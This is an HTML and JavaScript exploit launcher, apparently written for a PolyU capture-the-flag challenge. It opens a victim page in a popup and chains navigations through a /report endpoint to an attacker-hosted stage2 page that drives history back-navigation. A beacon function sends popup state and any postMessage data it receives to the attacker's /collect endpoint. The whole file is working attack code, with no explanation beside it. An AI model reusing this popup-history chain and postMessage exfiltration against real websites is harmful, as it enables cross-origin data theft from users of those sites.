<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>polyu history-chain launcher</title>
  <style>
    body { font-family: monospace; max-width: 960px; margin: 24px auto; }
    button { padding: 8px 14px; margin-right: 8px; }
    pre { background: #111; color: #0f0; padding: 16px; min-height: 280px; white-space: pre-wrap; }
  </style>
</head>
<body>
  <h1>polyu history-chain launcher</h1>
  <button id="run">run</button>
  <button id="rerun">rerun</button>
  <button id="close">close</button>
  <pre id="log"></pre>

  <script>
  const CFG = {
    TARGET_ORIGIN: 'http://chal.polyuctf.com:43037',
    SITE_ID: 'aa9b8164b33c733c6e398ac36cbd8c431afe30c5a9854285d48339befef9cf19',
    INITIAL_WAIT_MS: 2500,
    HOP_WAIT_MS: 300,
    BACK_DELAY_MS: 1200,
    BACK_COUNT: 2,
    EXTRA_PUSHES: 0,
    USE_ABOUT_BLANK_HOP: false,
    USE_REPORT_HOP: true,
    STAGE2_PATH: '/stage2.html',
    COLLECT_PATH: '/collect'
  };

  const victimUrl = `${CFG.TARGET_ORIGIN}/sites/${CFG.SITE_ID}`;
  let popup = null;
  let seq = 0;
  let lastPopupState = 'init';
  let lastPopupHref = '';
  const logBox = document.getElementById('log');

  function log(...args) {
    const line = `[${new Date().toISOString()}] ` + args.join(' ');
    console.log(line);
    logBox.textContent += line + '\n';
  }

  function beacon(kind, extra = {}) {
    const u = new URL(CFG.COLLECT_PATH, location.origin);
    u.searchParams.set('kind', kind);
    u.searchParams.set('ts', Date.now());
    u.searchParams.set('data', JSON.stringify(extra));
    new Image().src = u.toString();
  }

  function stage2Url() {
    const u = new URL(CFG.STAGE2_PATH, location.origin);
    u.searchParams.set('target', victimUrl);
    u.searchParams.set('backCount', String(CFG.BACK_COUNT));
    u.searchParams.set('extraPushes', String(CFG.EXTRA_PUSHES));
    u.searchParams.set('backDelay', String(CFG.BACK_DELAY_MS));
    u.searchParams.set('seq', String(++seq));
    return u.toString();
  }

  function nav(url) {
    try {
      popup.location = url;
      log('navigate ->', url);
    } catch (e) {
      log('navigate error:', e.message);
    }
  }

  function setPopupState(state, detail = '') {
    if (state !== lastPopupState || detail !== lastPopupHref) {
      lastPopupState = state;
      lastPopupHref = detail;
      log('popup-state =', state, detail);
      beacon('popup-state', { state, detail });
    }
  }

  function run(reuse = false) {
    const s2 = stage2Url();
    log('victim =', victimUrl);
    log('stage2 =', s2);
    beacon('start', { victimUrl, s2, cfg: CFG });

    if (!reuse || !popup || popup.closed) {
      popup = window.open(victimUrl, 'polyu_popup');
      if (!popup) {
        log('popup blocked');
        return;
      }
      log('opened popup');
      setPopupState('opened', victimUrl);
    } else {
      nav(victimUrl);
      setPopupState('navigated-to-victim', victimUrl);
    }

    setTimeout(() => {
      if (CFG.USE_ABOUT_BLANK_HOP) {
        nav('about:blank');
        setPopupState('navigated-to-aboutblank', 'about:blank');
        setTimeout(() => {
          nav(s2);
          setPopupState('navigated-to-stage2', s2);
        }, CFG.HOP_WAIT_MS);
        return;
      }

      if (CFG.USE_REPORT_HOP) {
        const reportUrl = `${CFG.TARGET_ORIGIN}/report`;
        nav(reportUrl);
        setPopupState('navigated-to-report', reportUrl);
        setTimeout(() => {
          nav(s2);
          setPopupState('navigated-to-stage2', s2);
        }, CFG.HOP_WAIT_MS);
        return;
      }

      nav(s2);
      setPopupState('navigated-to-stage2', s2);
    }, CFG.INITIAL_WAIT_MS);
  }

  window.addEventListener('message', (ev) => {
    log('postMessage:', JSON.stringify(ev.data), 'from', ev.origin);
    beacon('pm', { origin: ev.origin, data: ev.data });
  });

  setInterval(() => {
    if (!popup) return;

    if (popup.closed) {
      setPopupState('closed');
      return;
    }

    try {
      const href = popup.location.href;
      setPopupState('same-origin', href);
    } catch (e) {
      setPopupState('cross-origin', 'likely victim/report after back');
    }
  }, 500);

  document.getElementById('run').onclick = () => run(false);
  document.getElementById('rerun').onclick = () => run(true);
  document.getElementById('close').onclick = () => {
    if (popup && !popup.closed) popup.close();
    log('popup closed');
    setPopupState('closed-manually');
  };
</script>
</body>
</html>
